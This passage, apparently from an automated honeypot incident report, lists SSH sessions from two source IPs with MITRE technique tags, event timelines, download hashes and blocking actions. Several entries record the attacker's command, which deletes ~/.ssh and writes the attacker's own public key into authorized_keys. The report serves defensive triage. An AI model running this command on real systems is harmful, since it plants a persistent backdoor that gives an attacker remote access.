| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 11:49:23` | `cowrie.session.connect` |
| `2026-04-24 11:49:23` | `cowrie.client.version` |
| `2026-04-24 11:49:23` | `cowrie.client.kex` |
| `2026-04-24 11:49:24` | `cowrie.login.success` |
| `2026-04-24 11:49:24` | `cowrie.session.params` |
| `2026-04-24 11:49:24` | `cowrie.command.input` |
| `2026-04-24 11:49:24` | `cowrie.command.failed` |
| `2026-04-24 11:49:24` | `cowrie.log.closed` |
| `2026-04-24 11:49:24` | `cowrie.session.params` |
| `2026-04-24 11:49:24` | `cowrie.command.input` |
| `2026-04-24 11:49:25` | `cowrie.session.file_download` |
| `2026-04-24 11:49:25` | `cowrie.log.closed` |
| `2026-04-24 11:49:41` | `cowrie.session.params` |
| `2026-04-24 11:49:41` | `cowrie.command.input` |
| `2026-04-24 11:49:41` | `cowrie.log.closed` |
| `2026-04-24 11:49:41` | `cowrie.session.params` |
| `2026-04-24 11:49:41` | `cowrie.command.input` |
| `2026-04-24 11:49:41` | `cowrie.log.closed` |
| `2026-04-24 11:49:42` | `cowrie.session.params` |
| `2026-04-24 11:49:42` | `cowrie.command.input` |
| `2026-04-24 11:49:42` | `cowrie.session.file_download` |
| `2026-04-24 11:49:42` | `cowrie.log.closed` |
| `2026-04-24 11:49:42` | `cowrie.session.params` |
| `2026-04-24 11:49:42` | `cowrie.command.input` |
| `2026-04-24 11:49:42` | `cowrie.log.closed` |
| `2026-04-24 11:49:43` | `cowrie.session.params` |
| `2026-04-24 11:49:43` | `cowrie.command.input` |
| `2026-04-24 11:49:43` | `cowrie.log.closed` |
| `2026-04-24 11:49:43` | `cowrie.session.params` |
| `2026-04-24 11:49:43` | `cowrie.command.input` |
| `2026-04-24 11:49:43` | `cowrie.command.input` |
| `2026-04-24 11:49:44` | `cowrie.log.closed` |
| `2026-04-24 11:49:44` | `cowrie.session.params` |
| `2026-04-24 11:49:44` | `cowrie.command.input` |
| `2026-04-24 11:49:44` | `cowrie.log.closed` |
| `2026-04-24 11:49:44` | `cowrie.session.params` |
| `2026-04-24 11:49:44` | `cowrie.command.input` |
| `2026-04-24 11:49:45` | `cowrie.log.closed` |
| `2026-04-24 11:49:45` | `cowrie.session.params` |
| `2026-04-24 11:49:45` | `cowrie.command.input` |
| `2026-04-24 11:49:45` | `cowrie.log.closed` |
| `2026-04-24 11:49:46` | `cowrie.session.params` |
| `2026-04-24 11:49:46` | `cowrie.command.input` |
| `2026-04-24 11:49:46` | `cowrie.log.closed` |
| `2026-04-24 11:49:46` | `cowrie.session.params` |
| `2026-04-24 11:49:46` | `cowrie.command.input` |
| `2026-04-24 11:49:46` | `cowrie.log.closed` |
| `2026-04-24 11:49:47` | `cowrie.session.params` |
| `2026-04-24 11:49:47` | `cowrie.command.input` |
| `2026-04-24 11:49:47` | `cowrie.log.closed` |
| `2026-04-24 11:49:47` | `cowrie.session.params` |
| `2026-04-24 11:49:47` | `cowrie.command.input` |
| `2026-04-24 11:49:47` | `cowrie.log.closed` |
| `2026-04-24 11:49:48` | `cowrie.session.params` |
| `2026-04-24 11:49:48` | `cowrie.command.input` |
| `2026-04-24 11:49:48` | `cowrie.log.closed` |
| `2026-04-24 11:49:48` | `cowrie.session.params` |
| `2026-04-24 11:49:48` | `cowrie.command.input` |
| `2026-04-24 11:49:48` | `cowrie.log.closed` |
| `2026-04-24 11:49:49` | `cowrie.session.params` |
| `2026-04-24 11:49:49` | `cowrie.command.input` |
| `2026-04-24 11:49:49` | `cowrie.log.closed` |
| `2026-04-24 11:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.171[.]39` to AbuseIPDB if not already reported
- [ ] Block `27.128.171[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a752e7456b9

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:19 |
| **Last Seen** | 2026-04-24 12:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:19:19` | `cowrie.session.connect` |
| `2026-04-24 12:19:19` | `cowrie.client.version` |
| `2026-04-24 12:19:19` | `cowrie.client.kex` |
| `2026-04-24 12:19:19` | `cowrie.login.success` |
| `2026-04-24 12:19:19` | `cowrie.session.params` |
| `2026-04-24 12:19:19` | `cowrie.command.input` |
| `2026-04-24 12:19:19` | `cowrie.command.failed` |
| `2026-04-24 12:19:20` | `cowrie.log.closed` |
| `2026-04-24 12:19:20` | `cowrie.session.params` |
| `2026-04-24 12:19:20` | `cowrie.command.input` |
| `2026-04-24 12:19:20` | `cowrie.session.file_download` |
| `2026-04-24 12:19:20` | `cowrie.log.closed` |
| `2026-04-24 12:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e7bad1cedd0

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:19 |
| **Last Seen** | 2026-04-24 12:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:19:21` | `cowrie.session.connect` |
| `2026-04-24 12:19:21` | `cowrie.client.version` |
| `2026-04-24 12:19:21` | `cowrie.client.kex` |
| `2026-04-24 12:19:22` | `cowrie.login.success` |
| `2026-04-24 12:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b5794a4d63

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:22 |
| **Last Seen** | 2026-04-24 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:22:22` | `cowrie.session.connect` |
| `2026-04-24 12:22:22` | `cowrie.client.version` |
| `2026-04-24 12:22:22` | `cowrie.client.kex` |
| `2026-04-24 12:22:22` | `cowrie.login.success` |
| `2026-04-24 12:22:22` | `cowrie.session.params` |
| `2026-04-24 12:22:22` | `cowrie.command.input` |
| `2026-04-24 12:22:22` | `cowrie.command.failed` |
| `2026-04-24 12:22:22` | `cowrie.log.closed` |
| `2026-04-24 12:22:22` | `cowrie.session.params` |
| `2026-04-24 12:22:22` | `cowrie.command.input` |
| `2026-04-24 12:22:23` | `cowrie.session.file_download` |
| `2026-04-24 12:22:23` | `cowrie.log.closed` |
| `2026-04-24 12:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5dd2361eeae

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:22 |
| **Last Seen** | 2026-04-24 12:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:22:24` | `cowrie.session.connect` |
| `2026-04-24 12:22:24` | `cowrie.client.version` |
| `2026-04-24 12:22:24` | `cowrie.client.kex` |
| `2026-04-24 12:22:24` | `cowrie.login.success` |
| `2026-04-24 12:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdb429b1f482

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:25 |
| **Last Seen** | 2026-04-24 12:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:25:16` | `cowrie.session.connect` |
| `2026-04-24 12:25:16` | `cowrie.client.version` |
| `2026-04-24 12:25:16` | `cowrie.client.kex` |
| `2026-04-24 12:25:17` | `cowrie.login.success` |
| `2026-04-24 12:25:17` | `cowrie.session.params` |
| `2026-04-24 12:25:17` | `cowrie.command.input` |
| `2026-04-24 12:25:17` | `cowrie.command.failed` |
| `2026-04-24 12:25:17` | `cowrie.log.closed` |
| `2026-04-24 12:25:17` | `cowrie.session.params` |
| `2026-04-24 12:25:17` | `cowrie.command.input` |
| `2026-04-24 12:25:17` | `cowrie.session.file_download` |
| `2026-04-24 12:25:17` | `cowrie.log.closed` |
| `2026-04-24 12:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5fb93a62992

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:25 |
| **Last Seen** | 2026-04-24 12:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:25:19` | `cowrie.session.connect` |
| `2026-04-24 12:25:19` | `cowrie.client.version` |
| `2026-04-24 12:25:19` | `cowrie.client.kex` |
| `2026-04-24 12:25:19` | `cowrie.login.success` |
| `2026-04-24 12:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45be1c214497

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:27 |
| **Last Seen** | 2026-04-24 12:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:27:10` | `cowrie.session.connect` |
| `2026-04-24 12:27:10` | `cowrie.client.version` |
| `2026-04-24 12:27:10` | `cowrie.client.kex` |
| `2026-04-24 12:27:11` | `cowrie.login.success` |
| `2026-04-24 12:27:11` | `cowrie.session.params` |
| `2026-04-24 12:27:11` | `cowrie.command.input` |
| `2026-04-24 12:27:11` | `cowrie.command.failed` |
| `2026-04-24 12:27:11` | `cowrie.log.closed` |
| `2026-04-24 12:27:11` | `cowrie.session.params` |
| `2026-04-24 12:27:11` | `cowrie.command.input` |
| `2026-04-24 12:27:11` | `cowrie.session.file_download` |
| `2026-04-24 12:27:11` | `cowrie.log.closed` |
| `2026-04-24 12:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55390350afb6

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:27 |
| **Last Seen** | 2026-04-24 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:27:13` | `cowrie.session.connect` |
| `2026-04-24 12:27:13` | `cowrie.client.version` |
| `2026-04-24 12:27:13` | `cowrie.client.kex` |
| `2026-04-24 12:27:13` | `cowrie.login.success` |
| `2026-04-24 12:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d90c90320a5

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:32 |
| **Last Seen** | 2026-04-24 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:32:08` | `cowrie.session.connect` |
| `2026-04-24 12:32:08` | `cowrie.client.version` |
| `2026-04-24 12:32:08` | `cowrie.client.kex` |
| `2026-04-24 12:32:09` | `cowrie.login.success` |
| `2026-04-24 12:32:09` | `cowrie.session.params` |
| `2026-04-24 12:32:09` | `cowrie.command.input` |
| `2026-04-24 12:32:09` | `cowrie.command.failed` |
| `2026-04-24 12:32:09` | `cowrie.log.closed` |
| `2026-04-24 12:32:09` | `cowrie.session.params` |
| `2026-04-24 12:32:09` | `cowrie.command.input` |
| `2026-04-24 12:32:09` | `cowrie.session.file_download` |
| `2026-04-24 12:32:09` | `cowrie.log.closed` |
| `2026-04-24 12:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eaba0d68015

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:32 |
| **Last Seen** | 2026-04-24 12:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:32:11` | `cowrie.session.connect` |
| `2026-04-24 12:32:11` | `cowrie.client.version` |
| `2026-04-24 12:32:11` | `cowrie.client.kex` |
| `2026-04-24 12:32:11` | `cowrie.login.success` |
| `2026-04-24 12:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f693f374d23b

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:34 |
| **Last Seen** | 2026-04-24 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:34:08` | `cowrie.session.connect` |
| `2026-04-24 12:34:08` | `cowrie.client.version` |
| `2026-04-24 12:34:08` | `cowrie.client.kex` |
| `2026-04-24 12:34:08` | `cowrie.login.success` |
| `2026-04-24 12:34:08` | `cowrie.session.params` |
| `2026-04-24 12:34:08` | `cowrie.command.input` |
| `2026-04-24 12:34:08` | `cowrie.command.failed` |
| `2026-04-24 12:34:08` | `cowrie.log.closed` |
| `2026-04-24 12:34:08` | `cowrie.session.params` |
| `2026-04-24 12:34:08` | `cowrie.command.input` |
| `2026-04-24 12:34:09` | `cowrie.session.file_download` |
| `2026-04-24 12:34:09` | `cowrie.log.closed` |
| `2026-04-24 12:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74cfc8ba471a

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:34 |
| **Last Seen** | 2026-04-24 12:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:34:10` | `cowrie.session.connect` |
| `2026-04-24 12:34:10` | `cowrie.client.version` |
| `2026-04-24 12:34:10` | `cowrie.client.kex` |
| `2026-04-24 12:34:10` | `cowrie.login.success` |
| `2026-04-24 12:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9103cb21529

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:36 |
| **Last Seen** | 2026-04-24 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:36:13` | `cowrie.session.connect` |
| `2026-04-24 12:36:13` | `cowrie.client.version` |
| `2026-04-24 12:36:13` | `cowrie.client.kex` |
| `2026-04-24 12:36:13` | `cowrie.login.success` |
| `2026-04-24 12:36:13` | `cowrie.session.params` |
| `2026-04-24 12:36:13` | `cowrie.command.input` |
| `2026-04-24 12:36:13` | `cowrie.command.failed` |
| `2026-04-24 12:36:13` | `cowrie.log.closed` |
| `2026-04-24 12:36:14` | `cowrie.session.params` |
| `2026-04-24 12:36:14` | `cowrie.command.input` |
| `2026-04-24 12:36:14` | `cowrie.session.file_download` |
| `2026-04-24 12:36:14` | `cowrie.log.closed` |
| `2026-04-24 12:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-337699b02bad

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:36 |
| **Last Seen** | 2026-04-24 12:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:36:15` | `cowrie.session.connect` |
| `2026-04-24 12:36:15` | `cowrie.client.version` |
| `2026-04-24 12:36:15` | `cowrie.client.kex` |
| `2026-04-24 12:36:16` | `cowrie.login.success` |
| `2026-04-24 12:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb934e660f2e

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:37 |
| **Last Seen** | 2026-04-24 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
